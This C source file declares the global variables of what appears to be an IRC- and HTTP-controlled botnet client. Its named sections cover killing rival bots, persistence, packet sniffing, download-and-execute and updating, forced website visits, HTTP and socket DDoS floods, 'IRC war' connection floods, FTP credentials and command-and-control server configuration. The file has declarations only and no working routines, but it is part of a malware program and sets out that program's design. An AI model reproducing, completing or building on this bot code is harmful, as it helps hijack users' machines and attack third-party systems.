#include "../Includes/includes.h"

//Info
char            cRegistryKeyAccess[5];
DWORD           dwOperatingSystem;

//Botkiller
DWORD           dwKilledProcesses;
DWORD           dwFileChanges;
DWORD           dwRegistryKeyChanges;
bool            bBotkill;
//Under here is one-cycle stuff
bool            bBotkillOnce;
DWORD           dwKilledProcessesSaved;
DWORD           dwFileChangesSaved;
DWORD           dwRegistryKeyChangesSaved;
bool            bBotkillInitiatedViaCommand;

//Lock Computer
bool            bLockComputer;

//Packet sniff
bool            bPacketSniffing;

//Utility Variables
char            cZoneIdentifierSuffix[25];
bool            bComputerXpOrUnder;
char            cFileSaved[MAX_PATH];
char            cFileSavedDirectory[MAX_PATH];
char            cThisFile[MAX_PATH];
char            cFileHash[10];
unsigned long   ulFileHash;
char            cBuild[DEFAULT];
char            cStoreParameter[DEFAULT];
bool            bStoreParameter;
bool            bStoreParameter2;
DWORD           dwStoreParameter;
bool            bBotIsNew;
char            cMainProcessMutex[DEFAULT];
char            cBackupProcessMutex[DEFAULT];
char            cUninstallProcessMutex[DEFAULT];
char            cUpdateMutex[DEFAULT];
char            cHostsPath[MAX_PATH];
char            cReturnNewline[3];
char            cRegistryKeyToCurrentVersion[MAX_PATH];
int             nBootType;

//Ftp details
char            cFtpUser[DEFAULT];
char            cFtpPass[DEFAULT];
char            cFtpHost[DEFAULT];

//Booleans
bool            bPersist;
bool            bSilent;
bool            bUninstallProgram;
bool            bNewInstallation;
bool            bRecoveredProcess;

//Download, execute, and update related
char            cDownloadFromLocation[DEFAULT];
bool            bUpdate;
bool            bDownloadAbort;
bool            bExecutionArguments;
bool            bGlobalOnlyOutputMd5Hash;
bool            bMd5MustMatch;
char            szMd5Match[DEFAULT];

//Browser related
char            cBrowsers[5][DEFAULT];

//Startup Paths
char            cAllUsersStartupDirectory[MAX_PATH];
char            cUserStartupDirectory[MAX_PATH];
char            cAppData[MAX_PATH];
char            cTempDirectory[MAX_PATH];
char            cUserProfile[MAX_PATH];
char            cAllUsersProfile[MAX_PATH];
char            cProgramFiles[MAX_PATH];

//Windows Directory
char            cWindowsDirectory[MAX_PATH];

//File Search
unsigned long   ulTotalFiles;
unsigned long   ulMatchingFiles;
bool            bOutputFileSearch;
unsigned int    uiTotalContainingIframeContents;
bool            bBusyFileSearching;

//Website visit
unsigned int    uiSecondsBeforeVisit;
unsigned int    uiSecondsAfterVisit;
DWORD           dwSmartViewCommandType;
unsigned int    uiWebsitesInQueue;

//IRC hub management
unsigned int    nIrcSock;
char            cSend[MAX_IRC_SND_BUFFER];
char            cReceive[MAX_IRC_RCV_BUFFER];
DWORD           dwConnectionReturn;
char            cNickname[DEFAULT];
char            *pcParseLine;
char            *pcPartOfLine;
char            cIrcMotdOne[DEFAULT];
char            cIrcMotdTwo[DEFAULT];
char            cIrcJoinTopic[DEFAULT];
char            cIrcSetTopic[DEFAULT];
char            cCommandToChannel[DEFAULT];
char            cCommandToMe[DEFAULT];
bool            bAutoRejoinChannel;
char            cIrcResponseOk[10];
char            cIrcResponseErr[10];

//HTTP hub management
char            cUuid[44];
int             nCheckInInterval;
bool            bHttpRestart;
int             nCurrentTaskId;
int             nUninstallTaskId;
char            cHttpHostGlobal[MAX_PATH];
char            cHttpPathGlobal[MAX_PATH];
SOCKADDR_IN     httpreq;

//Flood related
bool            bDdosBusy;
DWORD           dwHttpPackets;
DWORD           dwSockPackets;
DWORD           dwHttpElapsedSeconds;
DWORD           dwSockElapsedSeconds;
char            cFloodHost[DEFAULT];
char            cFloodPath[DEFAULT];
char            cFloodData[DEFAULT];
unsigned short  usFloodPort;
unsigned short  usFloodType;
bool            bBrowserDdosBusy;

//Irc War related
char            cRemoteHost[DEFAULT];
unsigned short  usRemotePort;
unsigned short  usRemoteAttemptConnections;
unsigned short  usRemoteSuccessfulConnections;
bool            bRemoteIrcBusy;
SOCKET          sWar[MAX_WAR_CONNECTIONS];
DWORD           dwOpenSockets;
char            cRegisterQueryString[DEFAULT];
DWORD           dwValidatedConnectionsToIrc;
char            cCurrentWarStatus[100];
bool            bWarFlood;
char            cWarFloodTargetParam[DEFAULT];
bool            bNicknameRegisterTimer;
bool            bRegisterOnWarIrc;

//Base 64 characters
char            cBase64Characters[64];

//Config
char            cVersion[DEFAULT];
char            cServer[DEFAULT];
char            cBackup[DEFAULT];
char            cServers[10][MAX_PATH];
unsigned short  usPort;
char            cChannel[DEFAULT];
char            cChannelKey[DEFAULT];
char            cAuthHost[DEFAULT];
char            cOwner[DEFAULT];
char            cServerPass[DEFAULT];

bool bConfigSetupCheckpointOne = FALSE;
bool bConfigSetupCheckpointTwo = FALSE;
bool bConfigSetupCheckpointThree = FALSE;
bool bConfigSetupCheckpointFour = FALSE;
bool bConfigSetupCheckpointFive = FALSE;
bool bConfigSetupCheckpointSix = FALSE;
bool bConfigSetupCheckpointSeven = FALSE;
bool bConfigSetupCheckpointEight = FALSE;
bool bConfigSetupCheckpointNine = FALSE;
bool bConfigSetupCheckpointTen = FALSE;

//int nPortOffset;

int nExpirationDateMedian;
